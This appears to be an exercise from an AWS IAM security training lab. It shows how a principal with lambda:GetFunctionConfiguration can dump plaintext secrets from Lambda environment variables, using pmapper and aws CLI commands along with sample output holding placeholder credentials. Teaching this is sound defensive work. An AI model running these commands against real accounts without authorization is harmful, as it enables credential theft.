## Exercise 7: GetFunctionConfiguration - Credential Access

**Category:** Credential Access
**Starting IAM Principal:** `iamws-secrets-reader-user`
**Target:** Secrets in `iamws-app-with-secrets` Lambda environment variables

**The Vulnerability:** The `iamws-secrets-reader-user` can read Lambda function configurations, which include environment variables. A Lambda function has secrets (database password, API keys) stored in plaintext environment variables—visible to anyone who can call `GetFunctionConfiguration`.

**Real-world scenario:** A monitoring or debugging tool needs read access to Lambda configurations. Environment variables are a common (but insecure) place to store secrets. Anyone with this read permission can see all secrets.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-secrets-reader-user do lambda:GetFunctionConfiguration with *"
```

Expected output:
```
user/iamws-secrets-reader-user IS authorized to call action
lambda:GetFunctionConfiguration for resource *
```

### Part B: Understand the Attack Category

- **Category:** Credential Access
- **Required Permission:** `lambda:GetFunctionConfiguration`
- **Root Cause:** Secrets stored in plaintext Lambda environment variables
- **Impact:** Access to credentials for external systems (databases, APIs, etc.)

This category is different—you're not directly escalating IAM permissions- however in the real world Credential Access vulnerabilities like this commonly enable privilege escalation because secrets and credentials attached to more priviledged identities can be found in plain text. For Lambda functions, this is especially prevalant with credentials and API keys for third party SAAS providers.

### Part C: Exploit the Vulnerability

**Step 1: Find Lambdas with environment variables**
```bash
aws lambda list-functions \
  --query 'Functions[?Environment.Variables].FunctionName' \
  --output table \
  --profile iamws-secrets-reader-user
```

**Step 2: Read the secrets**
```bash
aws lambda get-function-configuration \
  --function-name iamws-app-with-secrets \
  --query 'Environment.Variables' \
  --output json \
  --profile iamws-secrets-reader-user
```

**Expected output (SECRETS EXPOSED!):**
```json
{
    "DB_HOST": "prod-db.example.internal",
    "DB_USERNAME": "app_service_account",
    "DB_PASSWORD": "SuperSecretPassword123!",
    "API_KEY": "sk-prod-api-key-do-not-expose",
    "ADMIN_CREDENTIALS": "admin:P@ssw0rd!"
}
```

**You just read production database credentials, API keys, and admin passwords.**

> [!NOTE]
> **Why no crown jewels S3 check here?** Unlike the other exercises, this is **credential access** — not IAM privilege escalation. The attacker's AWS permissions were never escalated, so the crown jewels S3 bucket stays safely out of reach. But don't underestimate this attack: in production, the exposed secrets (database passwords, API keys, admin credentials) often grant access to data that's just as sensitive as anything in S3 — customer PII in databases, admin consoles for SaaS tools, or credentials for external systems.

### What You Learned

- Lambda environment variables are **visible to anyone** with `GetFunctionConfiguration`
- This is NOT an IAM privilege escalation—it's credential theft
- Secrets in env vars is a **best practice violation**, not a policy misconfiguration

---

**Next:** [Back to Lab 1 — Wrap-up](../lab-1-instructions.md#wrap-up)
